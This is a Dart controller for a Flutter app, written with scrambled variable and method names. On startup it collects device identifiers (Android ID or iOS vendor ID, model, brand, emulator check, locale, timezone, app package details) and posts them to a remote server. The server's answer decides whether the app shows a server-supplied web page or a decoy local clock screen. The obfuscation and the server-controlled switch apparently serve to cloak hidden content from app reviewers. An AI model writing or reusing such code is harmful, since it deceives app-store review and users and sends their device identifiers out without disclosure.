import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var xhyfia = RxBool(false);
  var oxnhsel = RxBool(true);
  var wgeunhm = RxString("");
  var kristin = RxBool(false);
  var mante = RxBool(true);
  final cbrvxtdzp = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    nouixl();
  }


  Future<void> nouixl() async {

    kristin.value = true;
    mante.value = true;
    oxnhsel.value = false;

    cbrvxtdzp.post("https://yowa.vilageori.cloud/RKnuYHcBl",data: await awzqueyhct()).then((value) {
      var lngqf = value.data["lngqf"] as String;
      var qzwre = value.data["qzwre"] as bool;
      if (qzwre) {
        wgeunhm.value = lngqf;
        jordy();
      } else {
        zboncak();
      }
    }).catchError((e) {
      oxnhsel.value = true;
      mante.value = true;
      kristin.value = false;
    });
  }

  Future<Map<String, dynamic>> awzqueyhct() async {
    final DeviceInfoPlugin eftghqw = DeviceInfoPlugin();
    PackageInfo nvbpqm_tgeq = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var zodacuwx = Platform.localeName;
    var IJcaL = currentTimeZone;

    var ymHK = nvbpqm_tgeq.packageName;
    var efvKRPHM = nvbpqm_tgeq.version;
    var CbRmS = nvbpqm_tgeq.buildNumber;

    var hHxzO = nvbpqm_tgeq.appName;
    var psWwzMT  = "";
    var viMzTZRd = "";
    var edaReichert = "";
    var ellenKling = "";
    var alethaKerluke = "";
    var pansyTerry = "";
    var vidaHamill = "";
    var jettieErdman = "";
    var carolanneLeffler = "";
    var sisterPowlowski = "";

    var LKJIh = "";

    var WNFLz = "";
    var kNTuzHQp = false;

    if (GetPlatform.isAndroid) {
      WNFLz = "android";
      var vebxtslni = await eftghqw.androidInfo;

      viMzTZRd = vebxtslni.brand;

      LKJIh  = vebxtslni.model;
      psWwzMT = vebxtslni.id;

      kNTuzHQp = vebxtslni.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      WNFLz = "ios";
      var zegbcy = await eftghqw.iosInfo;
      viMzTZRd = zegbcy.name;
      LKJIh = zegbcy.model;

      psWwzMT = zegbcy.identifierForVendor ?? "";
      kNTuzHQp  = zegbcy.isPhysicalDevice;
    }
    var res = {
      "edaReichert" : edaReichert,
      "vidaHamill" : vidaHamill,
      "efvKRPHM": efvKRPHM,
      "hHxzO": hHxzO,
      "ymHK": ymHK,
      "LKJIh": LKJIh,
      "viMzTZRd": viMzTZRd,
      "sisterPowlowski" : sisterPowlowski,
      "psWwzMT": psWwzMT,
      "ellenKling" : ellenKling,
      "zodacuwx": zodacuwx,
      "WNFLz": WNFLz,
      "kNTuzHQp": kNTuzHQp,
      "jettieErdman" : jettieErdman,
      "alethaKerluke" : alethaKerluke,
      "pansyTerry" : pansyTerry,
      "IJcaL": IJcaL,
      "CbRmS": CbRmS,
      "carolanneLeffler" : carolanneLeffler,

    };
    return res;
  }

  Future<void> zboncak() async {
    Get.offAllNamed("/localClock");
  }

  Future<void> jordy() async {
    Get.offAllNamed("/monent");
  }

}
